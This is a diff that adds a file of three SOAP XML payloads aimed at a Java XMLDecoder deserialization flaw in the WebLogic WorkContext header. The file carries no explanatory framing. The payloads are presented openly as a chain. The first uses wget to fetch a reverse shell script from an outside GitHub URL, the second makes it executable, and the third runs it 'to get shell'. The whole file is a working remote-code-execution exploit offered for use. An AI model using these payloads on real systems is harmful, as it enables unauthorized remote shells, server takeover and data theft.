@@ -1,0 +1,65 @@
+[payload1] download the reverse_shell script
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+  <soapenv:Header>
+    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+        <java version="1.8.0_131" class="java.beans.XMLDecoder">
+          <void class="java.lang.ProcessBuilder">
+            <array class="java.lang.String" length="2">
+              <void index="0">
+                <string>/usr/bin/wget</string>
+              </void>
+              <void index="1">
+                <string>https://raw.githubusercontent.com/whuben/Useful-Scripts/master/reverse_shell.sh</string>
+              </void>
+            </array>
+          <void method="start"/></void>
+        </java>
+      </work:WorkContext>
+    </soapenv:Header>
+  <soapenv:Body/>
+</soapenv:Envelope>
+
+[payload2] chmod the previlege of the script
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+  <soapenv:Header>
+    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+        <java version="1.8.0_131" class="java.beans.XMLDecoder">
+          <void class="java.lang.ProcessBuilder">
+            <array class="java.lang.String" length="3">
+              <void index="0">
+                <string>/bin/chmod</string>
+              </void>
+              <void index="1">
+                <string>750</string>
+              </void>
+              <void index="2">
+                <string>./reverse_shell.sh</string>
+              </void>
+            </array>
+          <void method="start"/></void>
+        </java>
+      </work:WorkContext>
+    </soapenv:Header>
+  <soapenv:Body/>
+</soapenv:Envelope>
+
+[payload3] run the script to get shell
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+  <soapenv:Header>
+    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+        <java version="1.8.0_131" class="java.beans.XMLDecoder">
+          <void class="java.lang.ProcessBuilder">
+            <array class="java.lang.String" length="2">
+              <void index="0">
+                <string>/bin/sh</string>
+              </void>
+              <void index="1">
+                <string>./reverse_shell.sh</string>
+              </void>
+            </array>
+          <void method="start"/></void>
+        </java>
+      </work:WorkContext>
+    </soapenv:Header>
+  <soapenv:Body/>
+</soapenv:Envelope>
